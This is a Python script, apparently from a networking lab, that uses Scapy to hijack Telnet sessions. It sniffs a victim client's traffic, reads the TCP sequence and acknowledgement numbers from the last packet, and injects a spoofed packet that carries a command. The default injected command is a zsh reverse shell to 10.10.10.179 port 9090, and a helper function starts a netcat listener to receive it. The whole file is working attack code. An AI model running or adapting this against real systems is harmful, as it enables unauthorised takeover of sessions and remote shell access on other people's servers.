from scapy.all import *
from multiprocessing import Process

''' Global variables '''
command = ""
ip_client = ""
tcp_pkt_lst = []


'''
Sends the custom TCP packet to the server
and with the source as the client
'''
def hijack(sport, seq, ack, cmd, ip_dst):
    global ip_client
    ip = IP(src = ip_client, dst = ip_dst)
    tcp = TCP(sport = sport, dport = 23, flags = "A", seq = seq, ack = ack)
    data = "\n" + cmd + "\n"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose = 0)


'''
Appends a TCP packet with an 'A' flag
to the list of TCP packets.
'''
def append_tcp(pkt):
    global tcp_pkt_lst

    if (pkt[IP].src == ip_client and pkt.haslayer(TCP) and pkt[TCP].flags == "A" and pkt[TCP].dport == 23):
        tcp_pkt_lst.append(pkt)


'''
Executes on all TCP packets with an 'S' flag.
An 'S' flag signals the beginning of a connection,
hence for all connections the last TCP packet
after the login is desired.
Sniffs for a limited time (set at 10 seconds)
all the TCP packets after the initial 'S' packet.
After the last 'A' packet was found the hijack is started.
'''
def last_tcp_sniff(pkt):
    global tcp_pkt_lst, ip_client, command

    if (pkt[IP].src == ip_client and pkt.haslayer(TCP) and pkt[TCP].flags == "S" and pkt[TCP].dport == 23):
        sniff(filter = "tcp and host " + ip_client, timeout = 10, prn = append_tcp) #timeout should be 60
        last_tcp_pkt = tcp_pkt_lst[-1][TCP]
        last_ip_pkt = tcp_pkt_lst[-1][IP]
        hijack(sport = last_tcp_pkt[TCP].sport, seq = last_tcp_pkt[TCP].seq, ack = last_tcp_pkt[TCP].ack, 
	       cmd = command, ip_dst = last_ip_pkt[IP].dst)


''' 
Main process of the TCP hijacking.
Sniffs all TCP packets going from the client victim.
'''
def tcp_sniff(client, opt_command: str):
    global ip_client, command
    ip_client = client

    if (opt_command == ""):
        command = "zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.179 9090 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
    else:
        command = opt_command

    sniff(filter = "tcp and host " + ip_client, prn = last_tcp_sniff)


'''
Secondary process of the TCP hijacking.
Keeps open a terminal which can be used to 
execute commands on the hijacked server.
'''
def terminal_nc():
    os.system("x-terminal-emulator -e 'nc -nlvp 9090'")
